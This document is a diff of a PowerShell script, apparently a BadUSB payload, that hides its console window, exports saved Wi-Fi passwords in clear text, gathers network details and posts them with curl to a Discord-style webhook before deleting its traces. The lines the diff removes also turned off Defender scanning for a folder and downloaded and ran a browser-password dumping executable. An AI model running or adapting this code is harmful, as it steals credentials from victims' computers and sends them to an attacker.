@@ -2,19 +2,6 @@
 Add-Type -Name Win -Namespace P -MemberDefinition '[DllImport("kernel32.dll")]public static extern System.IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(System.IntPtr hWnd,int nCmdShow);';$h=[P.Win]::GetConsoleWindow();[P.Win]::ShowWindow($h,2)
 
 
-#Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\dump"
-Set-Location "$env:appdata\Microsoft\dump"
-#Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'https://raw.githubusercontent.com/GamehunterKaan/BadUSB-Browser/refs/heads/main/hackbrowser.exe' -OutFile "hb.exe"
-.\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
-#Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
-$Random = Get-Random
-
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
 
 #scrape the localappdata for password files
@@ -30,14 +17,11 @@ ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
 #send to discord
 
 #send http
-& curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" -F "file4=@$env:appdata\Microsoft\dump\dump.zip" $wh > $null 2>&1
+& curl.exe -F "content=Passwords for: $whoami_content | IP: $ip_add | @everyone" -F "file1=@$zip" -F "file2=@$e\wifi.txt" -F "file3=@$e\ipcfg.txt" $wh > $null 2>&1
 
 cls # clear console
 # cleanup
 
-cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
-Remove-MpPreference -ExclusionPath "$env:appdata"
 Remove-Item -Path "$e\wifi.txt"
 Remove-Item -Path "$e\ipcfg.txt"
 Remove-Item -Path "$zip"
